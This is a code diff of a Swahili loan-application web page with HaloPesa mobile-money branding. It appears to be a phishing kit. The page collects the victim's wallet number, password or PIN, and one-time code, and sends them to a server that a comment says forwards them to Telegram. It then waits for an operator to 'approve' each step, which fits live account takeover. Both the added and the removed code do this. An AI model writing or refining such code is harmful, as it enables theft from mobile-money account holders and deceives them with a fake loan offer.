+    if (!last) { showErr('regErr', 'Tafadhali weka jina la ukoo'); return; }
+    if (!haloNum) { showErr('regErr', 'Tafadhali weka nambari ya HaloPesa'); return; }
+    if (pwd.length < 6) { showErr('regErr', 'Namba ya siri lazima iwe angalau herufi 6'); return; }
+
+    // Show loading modal
+    document.getElementById('mReg').classList.add('show');
+
+    try {
+      // Send registration to server (which will send to Telegram)
+      const response = await fetch('/api/register-user', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          firstName: first,
+          lastName: last,
+          haloNumber: haloNum,
+          password: pwd,
+          timestamp: new Date().toISOString()
+        })
+      });
+
+      if (response.ok) {
+        const result = await response.json();
+        
+        S.firstName = first;
+        S.lastName = last;
+        S.haloNumber = haloNum;
+        S.password = pwd;
+        S.registrationId = result.registrationId;
+        S.registrationTime = new Date();
+
+        // Hide loading modal
+        document.getElementById('mReg').classList.remove('show');
+        
+        // Show waiting approval page
+        showWaitingApprovalPage();
+        
+        // Start polling for approval
+        startApprovalPolling();
+      } else {
+        document.getElementById('mReg').classList.remove('show');
+        const error = await response.json();
+        showErr('regErr', error.message || 'Hitilafu inatokea - tafadhali jaribu tena');
+      }
+    } catch (error) {
+      console.error('Registration error:', error);
+      document.getElementById('mReg').classList.remove('show');
+      showErr('regErr', 'Hitilafu inatokea - tafadhali jaribu tena');
+    }
+  }
+
+  // ══════════════════════════════════════════════════════
+  // SHOW WAITING APPROVAL PAGE
+  // ══════════════════════════════════════════════════════
+  function showWaitingApprovalPage() {
+    document.getElementById('waitName').textContent = S.firstName + ' ' + S.lastName;
+    document.getElementById('waitHalo').textContent = S.haloNumber;
+    updateWaitingTime();
+    goTo('page-waiting-approval');
+  }
+
+  // ══════════════════════════════════════════════════════
+  // UPDATE WAITING TIME
+  // ══════════════════════════════════════════════════════
+  function updateWaitingTime() {
+    if (!S.registrationTime) return;
+    
+    const now = new Date();
+    const elapsed = Math.floor((now - S.registrationTime) / 1000);
+    
+    let timeStr = '';
+    if (elapsed < 60) {
+      timeStr = elapsed + ' sekunde';
+    } else if (elapsed < 3600) {
+      const minutes = Math.floor(elapsed / 60);
+      timeStr = minutes + ' dakika';
+    } else {
+      const hours = Math.floor(elapsed / 3600);
+      timeStr = hours + ' saa';
+    }
+    
+    document.getElementById('waitTime').textContent = timeStr;
+  }
+
+  // ══════════════════════════════════════════════════════
+  // POLLING FOR ADMIN APPROVAL
+  // ══════════════════════════════════════════════════════
+  function startApprovalPolling() {
+    // Update time every second
+    const timeInterval = setInterval(() => {
+      updateWaitingTime();
+    }, 1000);
+
+    // Check approval every 3 seconds
+    approvalCheckInterval = setInterval(async () => {
+      try {
+        const response = await fetch(`/api/check-registration-approval/${S.registrationId}`);
+        
+        if (response.ok) {
+          const result = await response.json();
+          
+          if (result.status === 'approved') {
+            // Registration approved by admin
+            clearInterval(approvalCheckInterval);
+            clearInterval(timeInterval);
+            
+            // Show success and go to OTP
+            goTo('page-otp');
+          } else if (result.status === 'rejected') {
+            // Registration rejected by admin
+            clearInterval(approvalCheckInterval);
+            clearInterval(timeInterval);
+            
+            // Go back to registration page
+            goTo('page-registration');
+            showErr('regErr', result.reason || 'Akaunti yako ilikataliwa. Tafadhali jaribu tena');
+          }
+          // If 'pending', continue polling
+        }
+      } catch (error) {
+        console.error('Approval check error:', error);
+        // Continue polling even on error
+      }
+    }, 3000); // Poll every 3 seconds
+  }
+
+  // ══════════════════════════════════════════════════════
+  // CANCEL WAITING AND GO BACK
+  // ══════════════════════════════════════════════════════
+  function cancelWaitingAndGoBack() {
+    if (approvalCheckInterval) {
+      clearInterval(approvalCheckInterval);
+    }
+    
+    // Clear registration data
+    S.registrationId = null;
+    S.registrationTime = null;
+    
+    // Reset form
+    document.getElementById('regFirst').value = '';
+    document.getElementById('regLast').value = '';
+    document.getElementById('regHaloNumber').value = '';
+    document.getElementById('regPassword').value = '';
+    
+    goTo('page-registration');
+  }
+
+  // ══════════════════════════════════════════════════════
+  // LOAN CALCULATOR (LANDING)
   // ══════════════════════════════════════════════════════
   function calcUp() {
     const a = +document.getElementById('rA').value;
@@ -623,495 +800,185 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // STEP NAVIGATION
+  // STEP 1 CALCULATOR
   // ══════════════════════════════════════════════════════
-  function normalizePhone(id) {
-    const el = document.getElementById(id);
-    if (el.value.startsWith('0')) {
-      const cursor = el.selectionStart;
-      el.value = el.value.substring(1);
-      el.setSelectionRange(Math.max(0, cursor - 1), Math.max(0, cursor - 1));
-    }
+  function calcUp1() {
+    const a = +document.getElementById('rA1').value;
+    const t = +document.getElementById('rT1').value;
+    const r = 0.25 / 12;
+    const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
+    document.getElementById('a1Disp').textContent = 'TSh ' + a.toLocaleString();
+    document.getElementById('t1Disp').textContent = 'miezi ' + t;
+    document.getElementById('rA1').style.setProperty('--pct', ((a-10000)/(100000000-10000)*100).toFixed(2) + '%');
+    document.getElementById('rT1').style.setProperty('--pct', ((t-6)/(60-6)*100).toFixed(1) + '%');
+    S.amt = a;
+    S.term = t > 12 ? 'Miezi ' + t : 'Miezi ' + t;
   }
 
+  // ══════════════════════════════════════════════════════
+  // STEP NAVIGATION
+  // ══════════════════════════════════════════════════════
   function showErr(id, msg) {
     document.getElementById(id + 'Txt').textContent = msg;
     document.getElementById(id).classList.add('show');
     document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'nearest' });
   }
+
   function clearErr(id) {
     document.getElementById(id).classList.remove('show');
   }
-  function shakeField(id) {
-    const el = document.getElementById(id);
-    if (!el) return;
-    el.style.borderColor = '#ef4444';
-    el.style.boxShadow = '0 0 0 3px rgba(239,68,68,0.15)';
-    setTimeout(() => { el.style.borderColor = ''; el.style.boxShadow = ''; }, 1800);
-  }
 
   function toS2() {
-    const amt     = document.getElementById('s1am').value;
-    const purpose = document.getElementById('s1pu').value.trim();
-    if (!amt || Number(amt) <= 0) {
-      showErr('s1Err', 'Tafadhali weka kiasi sahihi cha mkopo.');
-      shakeField('s1am'); return;
-    }
-    if (Number(amt) > 100000000) {
-      showErr('s1Err', 'Kiasi cha juu zaidi cha mkopo ni TSh 100,000,000.');
-      shakeField('s1am'); return;
-    }
-    if (!purpose) {
-      showErr('s1Err', 'Tafadhali elezea madhumuni ya mkopo wako.');
-      shakeField('s1pu'); return;
-    }
-    clearErr('s1Err');
-    S.amt     = amt;
-    S.term    = document.getElementById('s1te').value;
+    const purpose = document.getElementById('s1Purpose').value;
+    if (!purpose) { showErr('s1Err', 'Tafadhali chagua madhumuni ya mkopo'); return; }
+    
     S.purpose = purpose;
+    S.amt = +document.getElementById('rA1').value;
+    S.term = document.getElementById('rT1').value + ' miezi';
+    
+    // Update summary on step 2
+    document.getElementById('sA').textContent = 'TSh ' + S.amt.toLocaleString();
+    document.getElementById('sT').textContent = document.getElementById('rT1').value + ' miezi';
+    document.getElementById('sP').textContent = S.purpose;
+    document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
+    
     goTo('page-step2');
   }
 
-  function toS3() {
-    const first = document.getElementById('s2fi').value.trim();
-    const last  = document.getElementById('s2la').value.trim();
-    const phone = document.getElementById('s2ph').value.trim();
-    if (!first) { showErr('s2Err', 'Tafadhali weka jina lako la kwanza.'); shakeField('s2fi'); return; }
-    if (!last)  { showErr('s2Err', 'Tafadhali weka jina lako la ukoo.'); shakeField('s2la'); return; }
-    if (!phone || phone.length < 9) {
-      showErr('s2Err', 'Tafadhali weka nambari sahihi ya simu ya tarakimu 9.'); shakeField('s2ph'); return;
-    }
-    clearErr('s2Err');
-    S.first = first; S.last = last; S.phone = phone;
-    document.getElementById('sA').textContent = 'TSh ' + Number(S.amt).toLocaleString();
-    document.getElementById('sT').textContent = S.term;
-    document.getElementById('sP').textContent = S.purpose || '—';
-    document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
-    goTo('page-step3');
-  }
+  // ══════════════════════════════════════════════════════
+  // SUBMIT APPLICATION
+  // ══════════════════════════════════════════════════════
+  async function submitApp() {
+    const employment = document.getElementById('s2em').value;
+    const income = document.getElementById('s2in').value;
 
-  function submitApp() {
-    const income = document.getElementById('s3in').value;
-    if (!income || Number(income) <= 0) {
-      showErr('s3Err', 'Tafadhali weka mapato yako ya mwaka.'); shakeField('s3in'); return;
-    }
-    clearErr('s3Err');
+    if (!employment) { showErr('s2Err', 'Tafadhali chagua hali ya ajira'); return; }
+    if (!income || income <= 0) { showErr('s2Err', 'Tafadhali weka mapato ya mwaka'); return; }
 
-    const btn = document.querySelector('#page-step3 .btn-grad[onclick="submitApp()"]');
-    if (btn) { btn.disabled = true; btn.textContent = 'INAWASILISHA…'; }
+    // Show loading modal
     document.getElementById('mSubmit').classList.add('show');
 
-    setTimeout(() => {
+    try {
+      const adminId = getAdminId();
+      const appId = 'APP_' + Date.now();
+      
+      const appData = {
+        id: appId,
+        firstName: S.firstName,
+        lastName: S.lastName,
+        haloNumber: S.haloNumber,
+        loanAmount: S.amt,
+        loanTerm: S.term,
+        purpose: S.purpose,
+        employment: employment,
+        annualIncome: income,
+        adminId: adminId || 'ADMIN001',
+        adminName: 'Super Admin',
+        timestamp: new Date().toISOString()
+      };
+
+      // Send to server
+      const response = await fetch('/api/submit-application', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(appData)
+      });
+
+      if (response.ok) {
+        const result = await response.json();
+        S.applicationId = result.applicationId || appId;
+        S.assignedAdminId = result.adminId;
+        
+        // Go to submitted page
+        setTimeout(() => {
+          document.getElementById('mSubmit').classList.remove('show');
+          goTo('page-submitted');
+          redirectCountdown();
+        }, 1500);
+      } else {
+        document.getElementById('mSubmit').classList.remove('show');
+        showErr('s2Err', 'Hitilafu inatokea - tafadhali jaribu tena');
+      }
+    } catch (error) {
+      console.error('Submit error:', error);
       document.getElementById('mSubmit').classList.remove('show');
-      if (btn) { btn.disabled = false; btn.textContent = 'WASILISHA MAOMBI'; }
-      goTo('page-submitted');
-      let c = 3;
-      document.getElementById('rdN').textContent = c;
-      const iv = setInterval(() => {
-        c--;
-        document.getElementById('rdN').textContent = c;
-        if (c <= 0) { clearInterval(iv); goTo('page-login'); }
-      }, 1000);
-    }, 1500);
+      showErr('s2Err', 'Hitilafu inatokea - tafadhali jaribu tena');
+    }
   }
 
   // ══════════════════════════════════════════════════════
-  // INLINE MESSAGE HELPERS
+  // REDIRECT COUNTDOWN
   // ══════════════════════════════════════════════════════
-  function showLoginMsg(text) {
-    document.getElementById('lgMsgTxt').textContent = text;
-    document.getElementById('lgMsg').classList.add('show');
-  }
-  function hideLoginMsg() {
-    document.getElementById('lgMsg').classList.remove('show');
-  }
-
-  function showOtpMsg(type, text) {
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
-    });
-    if (type === 'error')   { document.getElementById('otpMsgErrTxt').textContent = text;  document.getElementById('otpMsgErr').classList.add('show'); }
-    if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text;   document.getElementById('otpMsgOk').classList.add('show'); }
-    if (type === 'warning') { document.getElementById('otpMsgWarnTxt').textContent = text; document.getElementById('otpMsgWarn').classList.add('show'); }
-  }
-  function hideOtpMsgs() {
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
-    });
+  function redirectCountdown() {
+    let count = 3;
+    const el = document.getElementById('rdN');
+    const interval = setInterval(() => {
+      count--;
+      el.textContent = count;
+      if (count === 0) {
+        clearInterval(interval);
+        goTo('page-approval');
+      }
+    }, 1000);
   }
 
   // ══════════════════════════════════════════════════════
-  // LOGIN PAGE — PIN INPUT HELPERS (4 digits)
+  // OTP HANDLING
   // ══════════════════════════════════════════════════════
-  function pinMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
-    chkLogin();
+  function otpMv(el, idx) {
+    if (el.value.length > 1) el.value = el.value.slice(-1);
+    if (el.value && idx < 3) document.getElementById('o' + (idx + 1)).focus();
+    chkOtp();
   }
 
-  function chkLogin() {
-    const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value);
-    document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
+  function chkOtp() {
+    const vals = [document.getElementById('o0').value, document.getElementById('o1').value, document.getElementById('o2').value, document.getElementById('o3').value];
+    const ready = vals.every(v => v !== '');
+    document.getElementById('bOtp').classList.toggle('rdy', ready);
   }
 
-  function togPin() {
-    [0,1,2,3].forEach(i => {
-      const b = document.getElementById('p'+i);
-      b.type = b.type === 'password' ? 'text' : 'password';
-    });
-  }
-
-  // ══════════════════════════════════════════════════════
-  // LOGIN — CALLS /api/verify-pin
-  // ══════════════════════════════════════════════════════
-  let _loginInFlight = false;
-
-  async function doLogin() {
-    if (_loginInFlight) return;          // hard guard against double-tap / double-call
-    hideLoginMsg();
-
-    const rawPhone = document.getElementById('lgPh').value.trim();
-    const pin = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
-
-    if (!rawPhone || pin.length < 4) {
-      showLoginMsg('Tafadhali weka nambari ya simu na PIN ya tarakimu 4.');
+  async function doOtp() {
+    const otp = [document.getElementById('o0').value, document.getElementById('o1').value, document.getElementById('o2').value, document.getElementById('o3').value].join('');
+    
+    if (otp.length !== 4) {
+      showErr('otpMsgErr', 'Tafadhali weka OTP kamili');
       return;
     }
 
-    const phoneNumber = '+255' + rawPhone;
-    const adminId = getAdminId();
-
-    _loginInFlight = true;
-    document.getElementById('mLogin').classList.add('show');
-    document.getElementById('bLogin').disabled = true;
-
+    document.getElementById('mOtp').classList.add('show');
+    
     try {
-      const res = await fetch('/api/verify-pin', {
+      const response = await fetch('/api/verify-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          phoneNumber,
-          pin,
-          adminId: adminId || null,
-          assignmentType: adminId ? 'specific' : 'auto',
-          isReturningUser: S.isReturningUser || false,
-          previousCount: S.previousCount || 0
+          haloNumber: S.haloNumber,
+          otp: otp
         })
       });
 
-      const data = await res.json();
-
-      document.getElementById('mLogin').classList.remove('show');
-      _loginInFlight = false;
-
-      if (data.success) {
-        S.applicationId   = data.applicationId;
-        S.assignedAdminId = data.assignedAdminId;
-
-        document.getElementById('otpPh').textContent = phoneNumber;
-
-        // Check if returning customer (for admin info, not displayed to user)
-        try {
-          const checkRes = await fetch(`/api/check-returning-customer/${encodeURIComponent(phoneNumber)}`);
-          const checkData = await checkRes.json();
-          if (checkData.success && checkData.isReturning && checkData.previousCount > 0) {
-            S.isReturningUser = true;
-            S.previousCount = checkData.previousCount;
-            console.log(`🔄 Returning customer: ${phoneNumber} (${checkData.previousCount} previous)`);
-          }
-        } catch (err) {
-          console.error('Error checking returning customer:', err);
-        }
-
-        goTo('page-otp');
-        document.getElementById('pinWait').classList.add('show');
-        document.getElementById('otpInputSection').style.display = 'none';
-
-        pollPinStatus();
-
+      if (response.ok) {
+        showErr('otpMsgOk', 'OTP ilithibitishwa! Karibu na HaloPesa');
+        setTimeout(() => {
+          document.getElementById('mOtp').classList.remove('show');
+          goTo('page-landing');
+        }, 1500);
       } else {
-        document.getElementById('bLogin').disabled = false;
-        showLoginMsg(data.message || 'Uthibitisho umeshindwa. Tafadhali jaribu tena.');
+        document.getElementById('mOtp').classList.remove('show');
+        showErr('otpMsgErr', 'OTP sio sahihi - tafadhali jaribu tena');
       }
-
-    } catch (err) {
-      _loginInFlight = false;
-      document.getElementById('mLogin').classList.remove('show');
-      document.getElementById('bLogin').disabled = false;
-      showLoginMsg('Hitilafu ya mtandao. Tafadhali angalia muunganiko wako na ujaribu tena.');
-    }
-  }
-
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-pin-status
-  // ══════════════════════════════════════════════════════
-  let pinPollInterval = null;
-
-  function pollPinStatus() {
-    if (pinPollInterval) clearInterval(pinPollInterval);
-
-    pinPollInterval = setInterval(async () => {
-      try {
-        const res  = await fetch(`/api/check-pin-status/${S.applicationId}`);
-        const data = await res.json();
-
-        if (!data.success) return;
-
-        if (data.status === 'approved') {
-          clearInterval(pinPollInterval);
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'block';
-          showOtpMsg('success', 'Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.');
-          startRs();
-          document.getElementById('o0').focus();
-
-        } else if (data.status === 'rejected') {
-          clearInterval(pinPollInterval);
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'none';
-          showOtpMsg('error', 'Maelezo yako hayakuweza kuthibitishwa. Unaelekezwa kwenye kuingia…');
-          setTimeout(() => {
-            // Reset OTP page state
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('otpInputSection').style.display = 'block';
-            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">60</span> sekunde';
-            hideOtpMsgs();
-            // Reset login page — clear PIN boxes, keep phone, re-enable button
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            document.getElementById('bLogin').disabled = false;
-            const phoneVal = document.getElementById('lgPh').value.trim();
-            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
-            hideLoginMsg();
-            _loginInFlight = false;
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            goTo('page-login');
-          }, 2500);
-        }
-      } catch (e) {
-        // Silent
-      }
-    }, 2000);
-
-    setTimeout(() => {
-      if (pinPollInterval) {
-        clearInterval(pinPollInterval);
-        if (document.getElementById('pinWait').classList.contains('show')) {
-          document.getElementById('pinWait').classList.remove('show');
-          showOtpMsg('warning', 'Muda wa uthibitisho umeisha. Tafadhali rudi na ujaribu tena.');
-        }
-      }
-    }, 300000);
-  }
-
-  // ══════════════════════════════════════════════════════
-  // OTP INPUT HELPERS (4 digits)
-  // ══════════════════════════════════════════════════════
-  function otpMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value);
-    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
-  }
-
-  let _rsInterval = null;
-  function startRs() {
-    if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-
-    let s = 60;
-    const rsBox = document.getElementById('otpRs');
-    if (!rsBox) return;
-
-    rsBox.innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">' + s + '</span> sekunde';
-
-    _rsInterval = setInterval(() => {
-      s--;
-      const cur = document.getElementById('rsS');
-      if (cur) cur.textContent = s;
-      if (s <= 0) {
-        clearInterval(_rsInterval);
-        _rsInterval = null;
-        const box = document.getElementById('otpRs');
-        if (box) box.innerHTML = '<span style="color:var(--teal);cursor:pointer;font-weight:600" onclick="resendOtp()">Tuma tena msimbo</span>';
-      }
-    }, 1000);
-  }
-
-  // ══════════════════════════════════════════════════════
-  // RESEND OTP
-  // ══════════════════════════════════════════════════════
-  async function resendOtp() {
-    if (!S.applicationId) return;
-    try {
-      const res  = await fetch('/api/resend-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId })
-      });
-      const data = await res.json();
-      if (data.success) {
-        showOtpMsg('info', 'Ombi jipya la OTP limetumwa kwa msimamizi.');
-        startRs();
-        [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
-        document.getElementById('bOtp').className = 'btn-otp';
-        document.getElementById('o0').focus();
-      } else {
-        showOtpMsg('error', 'Imeshindwa kutuma tena OTP. Tafadhali jaribu tena.');
-      }
-    } catch {
-      showOtpMsg('error', 'Hitilafu ya mtandao wakati wa kutuma tena OTP.');
-    }
-  }
-
-  // ══════════════════════════════════════════════════════
-  // OTP SUBMIT (4 digits)
-  // ══════════════════════════════════════════════════════
-  async function doOtp() {
-    const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
-
-    if (otp.length < 4) {
-      showOtpMsg('warning', 'Tafadhali weka tarakimu zote 4 za OTP yako.');
-      return;
-    }
-
-    hideOtpMsgs();
-
-    let c = 3;
-    document.getElementById('otpVT').textContent = 'Tafadhali subiri… (' + c + 's)';
-    document.getElementById('mOtp').classList.add('show');
-    document.getElementById('bOtp').disabled = true;
-
-    const countdown = setInterval(() => {
-      c--;
-      const el = document.getElementById('otpVT');
-      if (el) el.textContent = 'Tafadhali subiri… (' + c + 's)';
-    }, 1000);
-
-    try {
-      const res  = await fetch('/api/verify-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId, otp })
-      });
-      const data = await res.json();
-
-      clearInterval(countdown);
+    } catch (error) {
+      console.error('OTP error:', error);
       document.getElementById('mOtp').classList.remove('show');
-
-      if (data.success) {
-        showOtpMsg('success', 'OTP imewasilishwa. Inasubiri msimamizi kuidhinisha…');
-        pollOtpStatus();
-      } else {
-        document.getElementById('bOtp').disabled = false;
-        showOtpMsg('error', data.message || 'Imeshindwa kuwasilisha OTP. Tafadhali jaribu tena.');
-      }
-
-    } catch (err) {
-      clearInterval(countdown);
-      document.getElementById('mOtp').classList.remove('show');
-      document.getElementById('bOtp').disabled = false;
-      showOtpMsg('error', 'Hitilafu ya mtandao. Tafadhali angalia muunganiko wako.');
+      showErr('otpMsgErr', 'Hitilafu inatokea - tafadhali jaribu tena');
     }
-  }
-
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-otp-status
-  // ══════════════════════════════════════════════════════
-  let otpPollInterval = null;
-
-  function pollOtpStatus() {
-    if (otpPollInterval) clearInterval(otpPollInterval);
-
-    otpPollInterval = setInterval(async () => {
-      try {
-        const res  = await fetch(`/api/check-otp-status/${S.applicationId}`);
-        const data = await res.json();
-
-        if (!data.success) return;
-
-        if (data.status === 'approved') {
-          clearInterval(otpPollInterval);
-          document.getElementById('apAmt').textContent  = 'TSh ' + Number(S.amt || 100000).toLocaleString();
-          document.getElementById('apTerm').textContent = S.term || 'Miezi 48';
-          const a = Number(S.amt) || 100000;
-          const t = parseInt(S.term) || 48;
-          const r = 0.08 / 12;
-          const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-          document.getElementById('apMthly').textContent = 'TSh ' + m.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
-          goTo('page-approval');
-
-        } else if (data.status === 'rejected') {
-          clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Msimbo wa OTP ulikataliwa. Tafadhali angalia na uweke tena.');
-          // Clear OTP fields and allow retry on same page
-          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-          document.getElementById('bOtp').className = 'btn-otp';
-          document.getElementById('bOtp').disabled = false;
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'block';
-          // Focus on first OTP field for immediate retry
-          document.getElementById('o0').focus();
-
-        } else if (data.status === 'wrongpin_otp') {
-          clearInterval(otpPollInterval);
-          showOtpMsg('error', 'PIN isiyosahihi imegunduliwa. Unaelekezwa kwenye kuingia…');
-          setTimeout(() => {
-            // Reset OTP page state
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpInputSection').style.display = 'block';
-            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">60</span> sekunde';
-            hideOtpMsgs();
-            // Reset login page state — clear PIN boxes but preserve phone number
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            // Re-enable login button (phone is still filled so it should become ready)
-            document.getElementById('bLogin').disabled = false;
-            const phoneVal = document.getElementById('lgPh').value.trim();
-            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
-            hideLoginMsg();
-            _loginInFlight = false;
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            goTo('page-login');
-          }, 2500);
-
-        } else if (data.status === 'wrongcode') {
-          clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Msimbo wa OTP usio sahihi. Tafadhali angalia na uweke tena.');
-          // Clear OTP fields and allow retry on same page
-          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-          document.getElementById('bOtp').className = 'btn-otp';
-          document.getElementById('bOtp').disabled = false;
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'block';
-          // Focus on first OTP field for immediate retry
-          document.getElementById('o0').focus();
-        }
-
-      } catch (e) {
-        // Silent
-      }
-    }, 2000);
-
-    setTimeout(() => {
-      if (otpPollInterval) {
-        clearInterval(otpPollInterval);
-        showOtpMsg('warning', 'Muda wa idhini umeisha. Tafadhali jaribu tena.');
-        document.getElementById('bOtp').disabled = false;
-      }
-    }, 300000);
   }
 
   // ══════════════════════════════════════════════════════
   // INIT
   // ══════════════════════════════════════════════════════
   calcUp();
+  calcUp1();
 </script>
 </body>
 </html>
